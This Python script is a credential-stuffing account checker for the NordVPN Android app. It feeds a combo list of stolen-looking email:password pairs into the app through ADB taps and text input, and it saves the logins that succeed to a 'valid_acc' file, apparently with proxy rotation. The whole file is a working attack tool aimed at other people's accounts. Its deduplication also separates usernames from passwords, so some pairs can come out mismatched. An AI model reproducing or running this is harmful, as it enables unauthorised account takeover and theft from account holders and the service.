#!/usr/bin/python3
#nordvpn 
# 'logcat *:E | grep' for logging Errors

import modules.header as header
import os
import modules.keyevents as keyevents
import modules.settings	as settings
import time

from modules.settings import directories as path
from modules.servers import GrabAProxy as proxies
from modules.servers import ProxyCheck

def Checker():

	print("\x1bc"); header.Checking()
	ctr=0 

	users=[] 
	passwords=[] 

	app='com.nordvpn.android'

	with open (path()+'/nord','r') as accounts:

		for lines in accounts:

			users.append(lines.split(":")[0])

			passwords.append(lines.split(":")[1].split("|")[0].strip())

		accounts.close()

	users=list(dict.fromkeys(users))
	passwords=list(dict.fromkeys(passwords))

	while ctr < len(users):
		print("\x1bc"); header.Checking()
		
		keyevents.Power(); keyevents.Menu(); keyevents.Tap(543,722)
		
		time.sleep(2)
		keyevents.StartApp(app)
		time.sleep(8)	
		keyevents.Tap(105,175) #Tap on close button showing up occasionally within App

		header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])
			
		keyevents.Tap(335,1253) #Log in Tap
		time.sleep(8)
			

		device_browser = keyevents.GetActivity('mCurrentFocus').split(" ")[4].split("/")[0] # This returns browser name in dumpsys (i.e. org.lineageos.jelly)
		
		keyevents.Tap(226,949) #Tap on email input form	
		time.sleep(6)
				
		settings.device.shell('input text "'+(str(users[ctr]))+'"') #Enter Email, Tab , Enter
		keyevents.Tab(1)
		keyevents.Enter()
		time.sleep(6)
	
		settings.device.shell('input text "'+(str(passwords[ctr]))+'"')	# Enter pass 
		keyevents.Tab(2)
		keyevents.Enter() # Click Log In
		time.sleep(8)
			
		while True:
		
			# If the current window in dumpsys window windows is 'ControlActivity'
			# then you are logged in
			
			if "ControlActivity" in str(keyevents.GetActivity('mCurrentFocus')):
				print("\x1bc")
			
				header.Valid()
				header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])
			
				with open (path()+'/valid_acc','a') as final:
					final.write(str(users[ctr])+":"+str(passwords[ctr])+("\n"))
					final.close()
					time.sleep(1)
					break
			else:
				header.Invalid()
				
				header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])
				time.sleep(1)
				break
	
		keyevents.StopApp(app);keyevents.ClearData(app) # Close + Clear Nord VPN		
		keyevents.StopApp(device_browser);keyevents.ClearData(device_browser) # Close + Clear Browser
		keyevents.Tap(571,972)
		keyevents.Power()
		ctr +=1

	return
